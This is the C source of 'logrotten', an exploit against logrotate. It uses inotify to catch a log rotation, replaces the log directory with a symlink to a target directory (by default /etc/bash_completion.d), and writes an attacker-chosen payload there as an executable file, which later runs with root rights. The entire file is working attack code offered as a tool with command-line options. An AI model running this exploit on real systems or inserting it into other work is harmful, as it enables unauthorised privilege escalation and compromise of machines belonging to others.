
#include <stdio.h>
#include <stdlib.h>
#include <errno.h>
#include <sys/types.h>
#include <sys/inotify.h>
#include <unistd.h>
#include <string.h>
#include <alloca.h>
#include <sys/stat.h>
#include <getopt.h>


#define EVENT_SIZE  ( sizeof (struct inotify_event) )
#define EVENT_BUF_LEN     ( 1024 * ( EVENT_SIZE + 16 ) )

/* use TARGETDIR without "/" at the end */
#define TARGETDIR "/etc/bash_completion.d"

#define PROGNAME "logrotten"

void usage(const char* progname)
{
	printf("usage: %s [OPTION...] <logfile>\n",progname);
	printf("  %-3s %-22s %-30s\n","-h","--help","Print this help");
	printf("  %-3s %-22s %-30s\n","-t","--targetdir <dir>","Abosulte path to the target directory");
	printf("  %-3s %-22s %-30s\n","-p","--payloadfile <file>","File that contains the payload");
	printf("  %-3s %-22s %-30s\n","-s","--sleep <sec>","Wait before writing the payload");
	printf("  %-3s %-22s %-30s\n","-d","--debug","Print verbose debug messages");
	printf("  %-3s %-22s %-30s\n","-c","--compress","Hijack compressed files instead of created logfiles");
	printf("  %-3s %-22s %-30s\n","-o","--open","Use IN_OPEN instead of IN_MOVED_FROM");
}

int main(int argc, char* argv[] )
{
  int length, i = 0;
  int j = 0;
  int index = 0;
  int fd;
  int wd;
  char buffer[EVENT_BUF_LEN];
  uint32_t imask = IN_MOVED_FROM;
  char *payloadfile = NULL;
  char *logfile = NULL;
  char *targetdir = NULL;
  char *logpath;
  char *logpath2;
  char *targetpath;
  int debug = 0;
  int sleeptime = 1;
  char ch;
  const char *p;
  FILE *source, *target;    

  int c;

  while(1)
  {
	int this_option_optind = optind ? optind : 1;
	int option_index = 0;
	static struct option long_options[] = {
		{"payloadfile", required_argument, 0, 0},
		{"targetdir", required_argument, 0, 0},
		{"sleep", required_argument, 0, 0},
		{"help", no_argument, 0, 0},

	{"open", no_argument, 0, 0},
		{"debug", no_argument, 0, 0},

		{"compress", no_argument, 0, 0},
		{0,0,0,0}
	};

	c = getopt_long(argc,argv,"hocdp:t:s:", long_options, &option_index);
	if (c == -1)
		break;

	switch(c)
	{
		case 'p':
			payloadfile = alloca((strlen(optarg)+1)*sizeof(char));
	  		memset(payloadfile,'\0',strlen(optarg)+1);
			strncpy(payloadfile,optarg,strlen(optarg));
			break;
		case 't':
			targetdir = alloca((strlen(optarg)+1)*sizeof(char));
	  		memset(targetdir,'\0',strlen(optarg)+1);
			strncpy(targetdir,optarg,strlen(optarg));
			break;
		case 'h':
			usage(PROGNAME);
			exit(EXIT_FAILURE);
			break;
		case 'd':
			debug = 1;
			break;
		case 'o':
			imask = IN_OPEN;
			break;
		case 'c':
			imask = IN_OPEN;
			break;
		case 's':
			sleeptime = atoi(optarg);
			break;
		default:
			usage(PROGNAME);
			exit(EXIT_FAILURE);
			break;
	}
  }

  if(argc == (optind+1))
  {
	  logfile = alloca((strlen(argv[optind])+1)*sizeof(char));
	  memset(logfile,'\0',strlen(argv[optind])+1);
	  strncpy(logfile,argv[optind],strlen(argv[optind]));
  }
  else
  {
	  usage(PROGNAME);
	  exit(EXIT_FAILURE);
  }

  for(j=strlen(logfile); (logfile[j] != '/') && (j != 0); j--);

  index = j+1;

  p = &logfile[index];

  logpath = alloca(strlen(logfile)*sizeof(char));
  logpath2 = alloca((strlen(logfile)+2)*sizeof(char));

  if(targetdir != NULL)
  {
  	targetpath = alloca( ( (strlen(targetdir)) + (strlen(p)) +3) *sizeof(char));
  	strcat(targetpath,targetdir);
  }
  else
  {
	targetdir= TARGETDIR;
  	targetpath = alloca( ( (strlen(TARGETDIR)) + (strlen(p)) +3) *sizeof(char));
        targetpath[0] = '\0';
  	strcat(targetpath,TARGETDIR);
  }
  strcat(targetpath,"/");
  strcat(targetpath,p);


  for(j = 0; j < index; j++)
	  logpath[j] = logfile[j];
  logpath[j-1] = '\0';

  strcpy(logpath2,logpath);
  logpath2[strlen(logpath)] = '2';
  logpath2[strlen(logpath)+1] = '\0';

  /*creating the INOTIFY instance*/
  fd = inotify_init();

  if( debug == 1)
  {
  	printf("logfile: %s\n",logfile);
  	printf("logpath: %s\n",logpath);
  	printf("logpath2: %s\n",logpath2);
  	printf("targetpath: %s\n",targetpath);
  	printf("targetdir: %s\n",targetdir);
  	printf("p: %s\n",p);
  }

  /*checking for error*/
  if ( fd < 0 ) {
    perror( "inotify_init" );
  }

  wd = inotify_add_watch( fd,logpath, imask );

  printf("Waiting for rotating %s...\n",logfile);

while(1)
{
  i=0;
  length = read( fd, buffer, EVENT_BUF_LEN ); 

  while (i < length) {     
      struct inotify_event *event = ( struct inotify_event * ) &buffer[ i ];     if ( event->len ) {
      if ( event->mask & imask ) { 
	  if(strcmp(event->name,p) == 0)
	  {
            rename(logpath,logpath2);
            symlink(targetdir,logpath);
	    printf("Renamed %s with %s and created symlink to %s\n",logpath,logpath2,targetdir);
	    if(payloadfile != NULL)
	    {
		 printf("Waiting %d seconds before writing payload...\n",sleeptime);
	   	 sleep(sleeptime);
	   	 source = fopen(payloadfile, "r");	    
	   	 if(source == NULL)
	   	         exit(EXIT_FAILURE);

	   	 target = fopen(targetpath, "w");	    
	   	 if(target == NULL)
	   	 {
	   	         fclose(source);
	   	         exit(EXIT_FAILURE);
	   	 }

	   	 while ((ch = fgetc(source)) != EOF)
	   	         fputc(ch, target);

	   	 chmod(targetpath,S_IRUSR | S_IXUSR | S_IRGRP | S_IXGRP | S_IROTH | S_IXOTH);
	   	 fclose(source);
	   	 fclose(target);
	    }
   	    inotify_rm_watch( fd, wd );
   	    close( fd );
	    printf("Done!\n");

	    exit(EXIT_SUCCESS);
	  }
      }
    }
    i += EVENT_SIZE + event->len;
  }
}
  /*removing from the watch list.*/
   inotify_rm_watch( fd, wd );

  /*closing the INOTIFY instance*/
   close( fd );

   exit(EXIT_SUCCESS);
}
